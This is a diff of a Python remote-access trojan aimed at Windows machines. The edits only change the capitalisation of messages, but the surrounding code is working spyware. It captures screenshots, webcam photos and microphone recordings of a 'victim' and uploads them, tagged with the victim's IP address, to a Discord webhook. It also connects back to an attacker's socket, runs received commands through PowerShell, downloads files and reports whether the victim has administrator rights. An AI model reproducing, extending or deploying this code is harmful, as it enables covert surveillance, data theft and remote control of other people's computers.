@@ -76,7 +76,7 @@ class back:
         img = pyautogui.screenshot("1.png")
         with open("1.png", "rb") as f:
             webhook.add_file(file=f.read(), filename='1.png')
-        embed = DiscordEmbed(title='Victim Screenshot',description=f'IP of the victim: {ipadd}',color='03fc30')
+        embed = DiscordEmbed(title='Victim Screenshot',description=f'IP Of The Victim: {ipadd}',color='03fc30')
         webhook.add_embed(embed)
         response = webhook.execute()
         os.remove("1.png")
@@ -90,12 +90,12 @@ class back:
             waitKey(0)
             with open("2.png", "rb") as f:
                 webhook.add_file(file=f.read(), filename='2.png')
-            embed = DiscordEmbed(title='Victim Webcam Photo',description=f'IP of the victim: {ipadd}',color='1d0a26')
+            embed = DiscordEmbed(title="Victim's Webcam Photo",description=f'IP Of The Victim: {ipadd}',color='1d0a26')
             webhook.add_embed(embed)
             response = webhook.execute()
             os.remove("2.png")
         else:
-            s.send(b"No image detected. Please! try again")
+            s.send(b"No Image Detected. Please Try Again!")
 
     def process_id(self):
         num = 1
@@ -121,12 +121,12 @@ class back:
             wv.write("recording1.wav", recording, freq, sampwidth=2)
             with open("recording1.wav", "rb") as f:
                 webhook.add_file(file=f.read(), filename='recording1.wav')
-            embed = DiscordEmbed(title='Victim Mic Recording',description=f'IP of the victim: {ipadd}',color='1d0a26')
+            embed = DiscordEmbed(title='Victim Mic Recording',description=f'IP Address Of The Victim: {ipadd}',color='1d0a26')
             webhook.add_embed(embed)
             response = webhook.execute()
             os.remove("recording1.wav")
         except:
-            s.send(b"[!] Can't record sound !!")
+            s.send(b"[!] Unable To Record Sound!")
     
     def open_url(self, link):
         webbrowser.open_new(link)
@@ -186,7 +186,7 @@ class back:
                 ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{x}" , 0)
 
             elif (cmd[:6] == "record"):
-                s.send(b"\n[+] 44100 frequency is recommended!!\n[+] Channel 2 is recommended!!\n")
+                s.send(b"\n[+] 44100 Frequency Is Recommended!!\n[+] Channel 2 Is Recommended!!\n")
                 ai = cmd[7:-1]
                 c = ai.split(" ")
                 self.record_sound(c[0], c[1], c[2], c[3])
@@ -200,7 +200,7 @@ class back:
                     print(to_download[8:])
                     self.download(to_download[8:])
                 except:
-                    s.send(b"\n[!] Can't Fetch the file!!\n")
+                    s.send(b"\n[!] Can't Fetch The File!!\n")
             else:
                 main = "powershell " + cmd
                 try:
@@ -213,10 +213,10 @@ class back:
         while True:
             try:
                 s.connect((ip, port))
-                if ctypes. windll. shell32. IsUserAnAdmin():
-                    s.send(colored(b"\n[+]>> User is running the script as 'ADMIN'\n", "blue"))
+                if ctypes.windll.shell32.IsUserAnAdmin():
+                    s.send(colored(b"\n[+]>> User Is Running Script As 'Administrator'\n", "blue"))
                 else:
-                    n = colored("\n[-]>> User is running the script as 'NON-ADMIN'\n", "red")
+                    n = colored("\n[-]>> User Is Running Script As 'Non Administrator'\n", "red")
                     s.send(n.encode())
                 break
             except socket.error:
@@ -224,7 +224,7 @@ class back:
         banner = (
                     "\n==============================================\n"+
                     f"|| IP:      --  {ipadd}               ||\n"+
-                     "|| help     -- Shows extra commands         || \n"+
+                     "|| help     -- Shows Extra Commands         || \n"+
                      "==============================================\n")
         s.send(banner.encode())
         self.getaway_mac()
